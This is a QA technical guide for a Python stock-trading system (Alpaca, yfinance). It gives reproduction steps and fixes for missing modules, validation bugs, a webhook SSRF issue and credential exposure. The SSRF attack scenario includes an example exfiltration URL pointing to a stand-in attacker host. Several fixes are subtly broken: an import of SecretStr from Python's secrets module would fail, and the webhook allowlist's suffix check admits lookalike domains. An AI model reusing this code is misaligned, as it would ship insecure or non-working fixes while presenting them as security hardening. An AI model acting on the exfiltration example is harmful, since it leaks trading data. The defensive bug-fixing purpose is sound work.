# QA Technical Reference - Bug Reproduction & Fix Guide

**Document**: Technical Details for Bug Fixes  
**Language**: Thai & English (Code)  
**Status**: For QA/Fixing Phase

---

## 🔴 CRITICAL ISSUES - REPRODUCTION GUIDE

### ISSUE #1: Missing quant.data Module

#### Reproduction
```bash
cd /home/user/quant-trading-system

# Test 1: Try to download data
python scripts/download_data.py --symbols AAPL --start 2024-01-01 --end 2024-01-31

# Test 2: Try to list strategies
python scripts/run_backtest.py --list

# Test 3: Try to start paper trading
python scripts/paper_trade.py --symbols SPY --strategy sma_cross --setup-only
```

#### Expected Error
```
ModuleNotFoundError: No module named 'quant.data'
```

#### Code Path Analysis
```
scripts/download_data.py:15
  ↓ from quant.data.loaders import download_to_parquet

scripts/paper_trade.py:32
  ↓ from quant.data.alpaca_data import AlpacaDataHandler

quant/runner.py:16
  ↓ from quant.data.historic import HistoricParquetDataHandler
```

#### Required Interfaces (Inferred from Usage)

**File**: `quant/data/base.py`
```python
from abc import ABC, abstractmethod

class DataHandler(ABC):
    """Abstract base for all data handlers."""
    
    @property
    @abstractmethod
    def continue_backtest(self) -> bool:
        """Return True if more bars available."""
        pass
    
    @abstractmethod
    def update_bars(self) -> None:
        """Fetch next bar(s) and emit MarketEvent(s)."""
        pass
    
    @abstractmethod
    def get_latest_bar_value(self, symbol: str, field: str) -> float | None:
        """Get latest value (close, open, high, low, volume).
        Return None if no data available."""
        pass
    
    @abstractmethod
    def get_latest_bar_datetime(self, symbol: str) -> pd.Timestamp:
        """Get latest bar's timestamp."""
        pass
    
    @abstractmethod
    def get_latest_bars_values(self, symbol: str, field: str, n: int) -> np.ndarray | None:
        """Get last n values for field (oldest first).
        Return None if < n values or any NaN."""
        pass
```

**File**: `quant/data/historic.py`
```python
class HistoricParquetDataHandler(DataHandler):
    """Load historical OHLCV data from parquet files."""
    
    def __init__(self, events, data_dir: str, symbols: list, 
                 start: str | pd.Timestamp, end: str | pd.Timestamp):
        self.events = events
        self.data_dir = data_dir
        self.symbol_list = list(symbols)
        self.start = pd.Timestamp(start)
        self.end = pd.Timestamp(end)
        self.bars = {}  # {symbol: DataFrame}
        self.current_index = 0
        self._load_data()
    
    def _load_data(self):
        """Load parquet files, align dates, initialize index."""
        # For each symbol:
        #   1. Load data/{symbol}.parquet
        #   2. Filter to [start, end]
        #   3. Check OHLCV columns exist
        #   4. Align all symbols to same dates
        #   5. Store in self.bars
        #   6. self.continue_backtest = True
    
    @property
    def continue_backtest(self) -> bool:
        return self.current_index < len(self._aligned_dates)
    
    def update_bars(self) -> None:
        """Move to next bar and emit MarketEvent."""
        if not self.continue_backtest:
            return
        # Emit MarketEvent(timestamp=self._aligned_dates[self.current_index])
        self.current_index += 1
    
    def get_latest_bar_value(self, symbol, field):
        if self.current_index == 0:
            return None
        dt = self._aligned_dates[self.current_index - 1]
        val = self.bars[symbol].loc[dt, field]
        return float(val) if pd.notna(val) else None
    
    # ... etc
```

**File**: `quant/data/loaders.py`
```python
def download_to_parquet(symbols: list, start: str, end: str, 
                        data_dir: str, interval: str = "1d") -> list:
    """Download from yfinance and save as parquet."""
    import yfinance as yf
    import os
    
    os.makedirs(data_dir, exist_ok=True)
    saved = []
    
    for symbol in symbols:
        try:
            df = yf.download(symbol, start=start, end=end, interval=interval,
                            progress=False, auto_adjust=True)
            if df.empty:
                print(f"  ✗ {symbol}: no data")
                continue
            
            # Ensure columns: open, high, low, close, volume (lowercase)
            df.columns = [c.lower() for c in df.columns]
            
            path = os.path.join(data_dir, f"{symbol}.parquet")
            df.to_parquet(path)
            saved.append(symbol)
            print(f"  ✓ {symbol}: {len(df)} bars")
        except Exception as e:
            print(f"  ✗ {symbol}: {e}")
    
    return saved
```

---

### ISSUE #2: No Dependencies Installed

#### Reproduction
```bash
python -c "import numpy"  # ModuleNotFoundError
python -c "import alpaca_py"  # ModuleNotFoundError
```

#### Fix
```bash
pip install -r requirements.txt
```

#### Verification
```bash
python -c "
import numpy
import pandas
import alpaca_py
import dotenv
import matplotlib
import yaml
print('✓ All dependencies installed')
"
```

---

## 🟠 MAJOR BUGS - REPRODUCTION & FIXES

### BUG #3: Portfolio.update_timeindex() IndexError

**File**: `quant/portfolio/portfolio.py`  
**Lines**: 54-76

#### Buggy Code
```python
def update_timeindex(self, event=None) -> None:
    """Snapshot positions and mark-to-market holdings for the latest bar."""
    latest_dt = self.data.get_latest_bar_datetime(self.symbol_list[0])  # ❌ IndexError if empty
    # ...
```

#### Reproduction
```python
from quant.portfolio.portfolio import Portfolio

portfolio = Portfolio(
    events=queue.Queue(),
    data_handler=mock_data,
    symbol_list=[],  # ❌ Empty!
    start_date="2024-01-01",
)

# When called:
portfolio.update_timeindex()  # IndexError: list index out of range
```

#### Fix
```python
def update_timeindex(self, event=None) -> None:
    """Snapshot positions and mark-to-market holdings for the latest bar."""
    if not self.symbol_list:  # ✓ Check first
        return
    
    latest_dt = self.data.get_latest_bar_datetime(self.symbol_list[0])
    # ... rest unchanged
```

---

### BUG #4: AlpacaExecutionHandler - Missing Filled Quantity Validation

**File**: `quant/execution/alpaca_exec.py`  
**Lines**: 51-68

#### Buggy Code
```python
def execute_order(self, event) -> None:
    # ...
    filled = self._await_fill(order.id)
    if filled is None or not filled.filled_avg_price:  # ❌ Doesn't check filled_qty
        print(f"! ... not filled within {self.poll_timeout:.0f}s")
        return

    fill_price = float(filled.filled_avg_price)
    qty = int(float(filled.filled_qty))  # ❌ Could be 0 or None
    ts = pd.Timestamp(filled.filled_at or datetime.now(timezone.utc))

    self.events.put(
        FillEvent(
            timestamp=ts, symbol=event.symbol, quantity=qty,  # ❌ qty could be 0
            direction=event.direction, fill_price=fill_price,
            commission=0.0, exchange="ALPACA",
        )
    )
```

#### Reproduction
```python
# Mock Alpaca returning partial/zero fill
filled = MockOrder(
    id="123",
    filled_avg_price=100.50,  # ✓ Has price
    filled_qty=0,             # ❌ But qty is 0
    filled_at="2024-06-20T10:00:00Z"
)

# Handler will emit FillEvent with qty=0
# Portfolio will be updated with 0 shares
# State becomes inconsistent!
```

#### Fix
```python
def execute_order(self, event) -> None:
    # ...
    filled = self._await_fill(order.id)
    if filled is None or not filled.filled_avg_price:
        print(f"! ... not filled within {self.poll_timeout:.0f}s")
        return

    fill_price = float(filled.filled_avg_price)
    qty = int(float(filled.filled_qty or 0))  # ✓ Default to 0
    
    if qty == 0:  # ✓ Check qty before emitting
        print(f"! {event.symbol} not filled (qty=0)")
        return
    
    ts = pd.Timestamp(filled.filled_at or datetime.now(timezone.utc))

    self.events.put(
        FillEvent(
            timestamp=ts, symbol=event.symbol, quantity=qty,
            direction=event.direction, fill_price=fill_price,
            commission=0.0, exchange="ALPACA",
        )
    )
```

---

### BUG #5: SimulatedExecutionHandler - Silent Failure on Gap Prices

**File**: `quant/execution/simulated.py`  
**Lines**: 67-76

#### Buggy Code
```python
def on_new_bar(self, event) -> None:
    """Fill everything queued on the previous bar at this bar's open."""
    if not self._pending:
        return
    pending, self._pending = self._pending, []
    for order in pending:
        price = self.data.get_latest_bar_value(order.symbol, "open")
        if price is None:  # Falls back to close
            price = self.data.get_latest_bar_value(order.symbol, "close")
        self._fill(order, price)  # ❌ price could STILL be None
```

#### Reproduction
```python
# Simulate gap day (no data for symbol)
data_handler.get_latest_bar_value("TSLA", "open")   # Returns None
data_handler.get_latest_bar_value("TSLA", "close")  # Returns None

# Order is lost silently
# Portfolio thinks order was placed, but it was dropped
# No log message!
```

#### Fix
```python
def on_new_bar(self, event) -> None:
    """Fill everything queued on the previous bar at this bar's open."""
    if not self._pending:
        return
    pending, self._pending = self._pending, []
    for order in pending:
        price = self.data.get_latest_bar_value(order.symbol, "open")
        if price is None:
            price = self.data.get_latest_bar_value(order.symbol, "close")
        
        if price is None:  # ✓ Check before filling
            print(f"! [gap] {order.symbol} {order.direction} x{order.quantity} - no price, order lost")
            continue  # Discard order (not ideal but better than silent loss)
        
        self._fill(order, price)
```

---

### BUG #6: MovingAverageCrossStrategy - Parameter Validation Incomplete

**File**: `quant/strategy/examples.py`  
**Lines**: 45-53

#### Buggy Code
```python
class MovingAverageCrossStrategy(_BaseLongOnly):
    def __init__(self, events, data_handler, symbol_list, short_window=50, long_window=200):
        super().__init__(events, data_handler, symbol_list)
        if short_window >= long_window:  # ✓ Checks order
            raise ValueError("short_window must be < long_window")
        # ❌ But doesn't check for zero or negative
        self.short_window = int(short_window)
        self.long_window = int(long_window)
```

#### Reproduction
```python
# Create with negative window
strategy = MovingAverageCrossStrategy(
    events, data, ["AAPL"],
    short_window=-10,  # ❌ Accepted!
    long_window=200
)

# Later crashes when trying to calculate SMA:
# indicators.sma(values, -10) causes issues
```

#### Fix
```python
class MovingAverageCrossStrategy(_BaseLongOnly):
    def __init__(self, events, data_handler, symbol_list, short_window=50, long_window=200):
        super().__init__(events, data_handler, symbol_list)
        
        # ✓ Validate ranges
        if short_window <= 0 or long_window <= 0:
            raise ValueError("Windows must be positive (> 0)")
        if short_window >= long_window:
            raise ValueError("short_window must be < long_window")
        
        self.short_window = int(short_window)
        self.long_window = int(long_window)
```

---

### BUG #7-11: Other Major Bugs (Summary)

| Bug | File | Issue | Fix |
|-----|------|-------|-----|
| #7 | `portfolio/portfolio.py:137-145` | Empty equity_curve not checked | Check `df.empty` before returning |
| #8 | `strategy/registry.py:36-41` | No parameter type validation | Add type coercion with error handling |
| #9 | `wealth/config.py:14-64` | No range validation on %s | Add `__post_init__` validators |
| #10 | `live/notify.py:26-40` | Webhook URL injection (SECURITY) | Validate URL format, require HTTPS |
| #11 | `execution/alpaca_exec.py:57-68` | Credential exposure risk | Use secrets module, avoid logs |

---

## 🔒 SECURITY FIXES

### Security Issue #1: Webhook URL Injection

**File**: `quant/live/notify.py`  
**Risk Level**: 🔴 CRITICAL (SSRF)

#### Vulnerable Code
```python
class WebhookNotifier(Notifier):
    def __init__(self, url: str, timeout: float = 5.0):
        self.url = url  # ❌ No validation!
    
    def notify(self, title: str, message: str) -> None:
        data = json.dumps({"text": text, "content": text}).encode("utf-8")
        req = urllib.request.Request(self.url, data=data, ...)  # Could POST to attacker's server
        urllib.request.urlopen(req, timeout=self.timeout)
```

#### Attack Scenario
```
1. User sets: ALERT_WEBHOOK_URL=http://attacker.com/exfil
2. Malicious .env file introduced
3. System POSTs all trade alerts to attacker
4. Attacker sees all trades and market positions
5. Could manipulate trading decisions
```

#### Fix
```python
from urllib.parse import urlparse

class WebhookNotifier(Notifier):
    ALLOWED_HOSTS = {"slack.com", "hooks.slack.com", "discordapp.com", "discord.com"}
    
    def __init__(self, url: str, timeout: float = 5.0):
        # ✓ Validate URL
        parsed = urlparse(url)
        
        if parsed.scheme not in ("https",):
            raise ValueError("Webhook URL must use HTTPS")
        
        if not any(parsed.netloc.endswith(host) for host in self.ALLOWED_HOSTS):
            raise ValueError(f"Webhook domain not whitelisted")
        
        self.url = url
        self.timeout = timeout
    
    def notify(self, title: str, message: str) -> None:
        text = f"**{title}** — {message}"
        data = json.dumps({"text": text, "content": text}).encode("utf-8")
        req = urllib.request.Request(
            self.url, data=data, headers={"Content-Type": "application/json"}
        )
        try:
            urllib.request.urlopen(req, timeout=self.timeout)
        except Exception as exc:
            # ✓ Don't print full URL in error
            print(f"! webhook notify failed: {type(exc).__name__}")
```

---

### Security Issue #2: Credential Exposure

**File**: `quant/settings.py`  
**Risk Level**: 🔴 CRITICAL

#### Vulnerable Code
```python
def get_alpaca_creds() -> tuple[str, str]:
    key = os.getenv("ALPACA_API_KEY")
    secret = os.getenv("ALPACA_SECRET_KEY")
    if not key or not secret:
        raise RuntimeError("Missing Alpaca credentials...")
    return key, secret  # ❌ Plain strings
```

#### Risk
```python
# Credentials might leak via:
key, secret = get_alpaca_creds()
print(f"DEBUG: {key=}, {secret=}")  # EXPOSED!
```

#### Fix
```python
import os
from secrets import SecretStr  # Use typing_extensions.Annotated if older Python

class _CredentialWrapper:
    """Wrapper to prevent accidental string repr of credentials."""
    def __init__(self, key: str, secret: str):
        self._key = key
        self._secret = secret
    
    def get_key(self) -> str:
        return self._key
    
    def get_secret(self) -> str:
        return self._secret
    
    def __repr__(self):
        return "<Credentials(****)>"
    
    def __str__(self):
        return "<Credentials(****)>"

def get_alpaca_creds() -> _CredentialWrapper:
    key = os.getenv("ALPACA_API_KEY")
    secret = os.getenv("ALPACA_SECRET_KEY")
    if not key or not secret:
        raise RuntimeError(
            "Missing Alpaca credentials. Copy .env.example to .env and set "
            "ALPACA_API_KEY and ALPACA_SECRET_KEY (use your *paper* keys)."
        )
    return _CredentialWrapper(key, secret)

# Usage:
# creds = get_alpaca_creds()
# key = creds.get_key()
# secret = creds.get_secret()
# print(creds)  # <Credentials(****)> - doesn't leak!
```

---

## ✅ VERIFICATION TESTS

### Test: Can import quant package
```python
import sys
sys.path.insert(0, '.')
from quant.runner import run_backtest
print("✓ Import successful")
```

### Test: Can download data
```bash
python scripts/download_data.py --symbols SPY --start 2024-01-01 --end 2024-01-31 --data-dir /tmp/test_data
# Check: ls /tmp/test_data/SPY.parquet
```

### Test: Can run backtest
```bash
python scripts/run_backtest.py --symbols SPY --strategy sma_cross --start 2024-01-01 --end 2024-06-30
# Check: results/ directory has equity_curve.csv, trades.csv, performance.png
```

### Test: Can do parameter validation
```python
from quant.strategy.examples import MovingAverageCrossStrategy

# Should raise:
try:
    MovingAverageCrossStrategy(..., short_window=-10, long_window=200)
    assert False, "Should have raised ValueError"
except ValueError as e:
    print(f"✓ Caught: {e}")
```

---

## 📚 REFERENCE CHECKLIST

For developers implementing fixes:

- [ ] Phase 1: Implement quant/data/ module
  - [ ] base.py (abstract DataHandler)
  - [ ] historic.py (HistoricParquetDataHandler)
  - [ ] alpaca_data.py (AlpacaDataHandler)
  - [ ] loaders.py (download_to_parquet)
  - [ ] Test: Can download data

- [ ] Phase 2: Fix major bugs
  - [ ] Add null checks (Portfolio.update_timeindex)
  - [ ] Add parameter validation (all strategies, configs)
  - [ ] Fix Alpaca fill validation
  - [ ] Add error logging

- [ ] Phase 3: Security
  - [ ] Validate webhook URLs
  - [ ] Protect credentials from logging
  - [ ] Update FX rates

- [ ] Phase 4: Tests
  - [ ] Unit tests for indicators
  - [ ] Unit tests for portfolio/risk
  - [ ] Integration tests for backtest
  - [ ] Mock Alpaca tests

---

**Document Version**: 1.0  
**Last Updated**: 20 มิถุนายน 2567  
**Status**: For QA/Development Use
